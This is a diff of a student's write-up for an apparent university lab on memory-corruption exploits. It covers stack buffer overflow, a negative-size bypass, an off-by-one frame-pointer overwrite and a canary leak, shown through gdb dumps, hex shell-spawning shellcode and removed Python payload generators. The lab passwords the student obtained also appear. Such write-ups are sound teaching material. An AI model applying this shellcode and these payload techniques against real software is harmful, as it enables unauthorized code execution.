@@ -1,7 +1,8 @@
 ## 1
 
-The makefile is interesting and I think the professor tried his best to
-make the program unsafe.
+- a description of the vulnerability
+
+
 Just run gdb and see what happens:
 
 ```
@@ -45,7 +46,52 @@ c
 
 I saw that eax is 0xbffffab8. The return address should original be 0xb7ffc4d3 (in main), and I can easily find it at 0xbffffacc. So I should put payload at 0xbffffad0 and input `0123456789abcdef0123456789abcdef01234567 + bffffa40 + payload`, where paylaod is `6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a`. After fixing byte sequence problem with python, the input.txt is ready.
 
-Now I can see 
+- how it could be exploited
+
+buffer overflow. already explained above.
+
+- how you determined which address to jump to
+
+hardcoded
+
+- a detailed explanation of your solution
+
+```
+(gdb) run < input.txt 
+Starting program: /home/vsftpd/dejavu < input.txt
+
+Breakpoint 1, deja_vu () at dejavu.c:7
+7	  gets(door);
+(gdb) print (void *)door
+$1 = (void *) 0xbffffab8
+(gdb) x/32x 0xbffffab8
+0xbffffab8:	0xbffffb6c	0xb7ffc165	0x00000000	0x00000000
+0xbffffac8:	0xbffffad8	0xb7ffc4d3	0x00000000	0xbffffaf0
+0xbffffad8:	0xbffffb6c	0xb7ffc6ae	0xb7ffc648	0xb7ffefd8
+0xbffffae8:	0xbffffb64	0xb7ffc6ae	0x00000001	0xbffffb64
+0xbffffaf8:	0xbffffb6c	0x00000000	0x00000000	0x00000100
+0xbffffb08:	0xb7ffc682	0xb7ffefd8	0x00000000	0x00000000
+0xbffffb18:	0x00000000	0xb7ffc32a	0xb7ffc4bd	0x00000001
+0xbffffb28:	0xbffffb64	0xb7ffc158	0xb7ffd19d	0x00000000
+(gdb) break 8
+Breakpoint 2 at 0xb7ffc4ba: file dejavu.c, line 8.
+(gdb) c
+Continuing.
+
+Breakpoint 2, deja_vu () at dejavu.c:8
+8	}
+(gdb) x/32x 0xbffffab8
+0xbffffab8:	0x01234567	0x89abcdef	0x01234567	0x89abcdef
+0xbffffac8:	0x01234567	0xbffffad0	0xcd58316a	0x89c38980
+0xbffffad8:	0x58466ac1	0xc03180cd	0x2f2f6850	0x2f68736c
+0xbffffae8:	0x546e6962	0x8953505b	0xb0d231e1	0x0080cd0b
+0xbffffaf8:	0xbffffb00	0x00000000	0x00000000	0x00000100
+0xbffffb08:	0xb7ffc682	0xb7ffefd8	0x00000000	0x00000000
+0xbffffb18:	0x00000000	0xb7ffc32a	0xb7ffc4bd	0x00000001
+0xbffffb28:	0xbffffb64	0xb7ffc158	0xb7ffd19d	0x00000000
+
+```
+
 ```
 pwnable:~$ ./exploit 
 dumb-shell $ id
@@ -57,47 +103,67 @@ Next username: smith
 Next password: 37ZFBrAPm8
 ```
 
-My code is attached below
-```
-#!/usr/bin/python3
-
-def fuck8(txt):
-    assert(len(txt) == 8)
-    return txt[6:8] + txt[4:6] + txt[2:4] + txt[0:2]
-
-def revert(txt):
-    assert(len(txt) % 8 == 0)
-    res = ""
-    for i in range(int(len(txt) / 8)):
-        res += fuck8(txt[i*8:(i+1)*8])
-    return res
-
-
-fill = "0123456789abcdef0123456789abcdef01234567"
-#cs161-ace# raddr = "bffffa40"
-#cs161-atw# raddr = "bffffad0"
-raddr = "bffffad0"
-#shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
-shellcode = "6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a"
-########################################################################################### <- append an endline (0x0a, \n)
-
-payload = revert(fill) + revert(raddr) + (shellcode)
-#print(payload)
-
-import binascii
-
-b = binascii.unhexlify(payload)
-with open('/dev/fd/1','wb') as f:
-    f.write(b)
-```
 
 ## 2
+
+- a description of the vulnerability
+
+already explained in problem 1.
+
+- how it could be exploited
 
 Just do as what I did in problem 1. I can see the return address is 0x00400775, stored at &msg+128+20.
 Because the buffer is large enough, I'll put payload here. &msg is 0xbffffa18, so I must change 0x00400775
 to 0xbffffa18.
 
-Oh I didn't tell you how should I bypass the `size` limit. Just put a `-1` and enjoy your day.
+Oh I didn't tell you how should I bypass the `size` limit. Just put a `-1` and enjoy it.
+
+- how you determined which address to jump to
+
+hardcoded.
+
+- a detailed explanation of your solution
+
+```
+(gdb) run
+Starting program: /home/smith/agent-smith pwnzerized
+
+Breakpoint 2, display (path=0xbffffc5e "pwnzerized") at agent-smith.c:9
+9	  memset(msg, 0, 128);
+(gdb) print (void *)msg
+$1 = (void *) 0xbffffa18
+(gdb) x/32x 0xbffffa18
+0xbffffa18:	0xb7ffd2d0	0x00400429	0x00000002	0xb7ffcf5c
+0xbffffa28:	0x00000000	0xb7fc8d99	0x00000000	0x00400034
+0xbffffa38:	0xbffffa40	0x00000008	0x01be3c6e	0x00000001
+0xbffffa48:	0x00000030	0x00001fb8	0x00000000	0x000002a0
+0xbffffa58:	0x00000180	0x00000000	0x00000000	0x00000000
+0xbffffa68:	0x000000fc	0x00000010	0x0000041c	0x000007ac
+0xbffffa78:	0x00000000	0x00000000	0x00000000	0x0000039c
+0xbffffa88:	0x00000050	0x00000008	0x00000011	0xb7fff1a8
+(gdb) c
+Continuing.
+
+Breakpoint 1, display (path=0xbffffc5e "pwnzerized") at agent-smith.c:21
+21	  puts(msg);
+(gdb) x/64x 0xbffffa18
+0xbffffa18:	0xcd58316a	0x89c38980	0x58466ac1	0xc03180cd
+0xbffffa28:	0x2f2f6850	0x2f686873	0x546e6962	0x8953505b
+0xbffffa38:	0xb0d231e1	0x0a80cd0b	0x01010101	0x01010101
+0xbffffa48:	0x01010101	0x01010101	0x01010101	0x01010101
+0xbffffa58:	0x01010101	0x01010101	0x01010101	0x01010101
+0xbffffa68:	0x01010101	0x01010101	0x01010101	0x01010101
+0xbffffa78:	0x01010101	0x01010101	0x01010101	0x01010101
+0xbffffa88:	0x01010101	0x01010101	0x01010101	0x01010101
+0xbffffa98:	0x00000098	0x01010101	0x01010101	0x01010101
+0xbffffaa8:	0x01010101	0xbffffa18	0xbffffc5e	0x00000000
+0xbffffab8:	0x00000000	0x00400751	0x00000000	0xbffffae0
+0xbffffac8:	0xbffffb60	0xb7f8cc8b	0xbffffb54	0x00000002
+0xbffffad8:	0xbffffb60	0xb7f8cc8b	0x00000002	0xbffffb54
+0xbffffae8:	0xbffffb60	0x00000008	0x00000000	0x00000000
+0xbffffaf8:	0xb7f8cc5f	0x00401fb8	0xbffffb50	0xb7ffede4
+0xbffffb08:	0x00000000	0x00400505	0x0040073b	0x00000002
+```
 
 Now I can see
 
@@ -115,46 +181,60 @@ Next username: brown
 Next password: mXFLFR5C62
 ```
 
-My code is attached below.
-```
-#!/usr/bin/python3
-
-def fuck8(txt):
-    assert(len(txt) == 8)
-    return txt[6:8] + txt[4:6] + txt[2:4] + txt[0:2]
-
-def revert(txt):
-    assert(len(txt) % 8 == 0)
-    res = ""
-    for i in range(int(len(txt) / 8)):
-        res += fuck8(txt[i*8:(i+1)*8])
-    return res
-
-
-raddr = "bffffa18"
-#shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
-shellcode = "6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a"
-
-length_to_fill = 20 + 128 - int(len(shellcode)/2)
-fill = "01" * length_to_fill
-
-int8_neg1 = "ff"
-
-payload = int8_neg1 + (shellcode) + fill + revert(raddr)
-#print(payload)
-
-import binascii
-
-b = binascii.unhexlify(payload)
-with open('/dev/fd/1','wb') as f:
-    f.write(b)
-```
-
 ## 3
 
-The question is off-by-one overflow problem. After reading aslr.pdf figure 30, I know that I should set %ebp to &buf[0] (0xbffffa40), and put the new return address in &buf[1], and put the payload. So I should overflow an "40" to %ebp. Now I'll do it.
+![aslr.pdf figure 30](https://dl.recolic.net/res/161-proj1-3.png)
+
+- description of the vulnerability
+
+The question is off-by-one overflow problem. 
+
+- how it could be exploited
+
+After reading aslr.pdf figure 30, I know that I should set %ebp to &buf[0] (0xbffffa40), and put the new return address in &buf[1], and put the payload. So I should overflow an "40" to %ebp. Now I'll do it.
+
+- how you determined which address to jump to
+
+I hardcoded it to &buf[2].
+
+- REALLY IMPORTANT NOTE
 
 However, after implementing the solution above, ./debug-exploit works but ./exploit doesn't. That's because overflowed "0x40" xor "1<<5" yields "`", which is beaking the shell (in the buggy exploit script). So I shift everything 4 bytes right. Now %ebp is set to &buf[1] and new return address is set to &buf[2] and overflowed byte is "44". Now everything is OK.
+
+- a detailed explanation of your solution
+
+```
+(gdb) print (void *)buf
+$1 = (void *) 0xbffffa40
+(gdb) x/32x 0xbffffa40
+0xbffffa40:	0x00000000	0x00000001	0x00000000	0xbffffbeb
+0xbffffa50:	0x00000000	0x00000000	0x00000000	0xb7ffc44e
+0xbffffa60:	0x00000000	0xb7ffefd8	0xbffffb20	0xb7ffc165
+0xbffffa70:	0x00000000	0x00000000	0x00000000	0xb7ffc6dc
+0xbffffa80:	0xbffffa8c	0xb7ffc539	0xbffffc27	0xbffffa98
+0xbffffa90:	0xb7ffc55d	0xbffffc27	0xbffffb20	0xb7ffc734
+0xbffffaa0:	0x00000002	0xbffffb14	0xbffffb20	0x00000000
+0xbffffab0:	0x00000000	0x00000100	0xb7ffc708	0xb7ffefd8
+(gdb) break 20
+Breakpoint 2 at 0xb7ffc51f: file agent-brown.c, line 20.
+(gdb) c
+Continuing.
+
+Breakpoint 2, invoke (
+    in=0xbffffc27 "!\003eG!\003eGl\332ߟJ\021x\355\240\251\343\251\341Jfx\355\240\021\340pH\017\017SHH\017BINt{ps\251\301\021\362\220+\355\240*", '!' <repeats 12 times>, "d")
+    at agent-brown.c:20
+20	  puts(buf);
+(gdb) x/32x 0xbffffa40
+0xbffffa40:	0x67452301	0x67452301	0xbffffa4c	0xcd58316a
+0xbffffa50:	0x89c38980	0x58466ac1	0xc03180cd	0x2f2f6850
+0xbffffa60:	0x2f686873	0x546e6962	0x8953505b	0xb0d231e1
+0xbffffa70:	0x0a80cd0b	0x01010101	0x01010101	0x01010101
+0xbffffa80:	0xbffffa44	0xb7ffc539	0xbffffc27	0xbffffa98
+0xbffffa90:	0xb7ffc55d	0xbffffc27	0xbffffb20	0xb7ffc734
+0xbffffaa0:	0x00000002	0xbffffb14	0xbffffb20	0x00000000
+0xbffffab0:	0x00000000	0x00000100	0xb7ffc708	0xb7ffefd8
+```
+
 
 ```
 pwnable:~$ ./exploit
@@ -168,64 +248,11 @@ Next username: jz
 Next password: cqkeuevfIO
 ```
 
-My `./arg` is still attached below. Note that my `./egg` is empty.
-
-```
-#!/usr/bin/python3
-
-def fuck8(txt):
-    assert(len(txt) == 8)
-    return txt[6:8] + txt[4:6] + txt[2:4] + txt[0:2]
-
-def revert(txt):
-    assert(len(txt) % 8 == 0)
-    res = ""
-    for i in range(int(len(txt) / 8)):
-        res += fuck8(txt[i*8:(i+1)*8])
-    return res
-
-## The FUCKING silly script booms the shell because overflow="40"="`".
-## cs161-atw
-#raddr = "bffffa48"
-##shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
-#shellcode = "6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a"
-#
-#overflow = "40" 
-#buf0 = "01234567"
-#
-#length_to_fill = 64 - 8 - int(len(shellcode)/2)
-#fill = "01" * length_to_fill
-#
-#payload = buf0 + revert(raddr) + (shellcode) + fill + overflow
-
-## cs161-atw
-raddr = "bffffa4c"
-#shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
-shellcode = "6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a"
-
-overflow = "44"
-buf0 = "01234567"
-
-length_to_fill = 64 - 8 - 4 - int(len(shellcode)/2)
-fill = "01" * length_to_fill
-
-payload = buf0 + buf0 + revert(raddr) + (shellcode) + fill + overflow
-
-
-import binascii
-
-b = binascii.unhexlify(payload)
-b = bytes([byte^(1<<5) for byte in b])
-with open('/dev/fd/1','wb') as f:
-    f.write(b)
-
-```
-
 ## 4
 
-The solution is easy. Since BUFLEN=16, I send `0123456789ab\x`, then dehexify skips the `\0` and prints everything in canary area.
+The solution is easy. Since BUFLEN=16, I send `0123456789ab\x`, then dehexify skips the `\0` and prints everything in canary area. Now I can determine the canary value.
 
-Now I construct a message with 16 junk characters to fill the buffer, correct canary, another 8 characters to shift ebp & other staffes, and the return address, then the shellcode.
+Now I construct a message with 16 junk characters to fill the buffer + correct canary + another 8 characters to shift ebp & other staffes + the return address (pointing to the following shellcode) + shellcode.
 
 
 ## 5
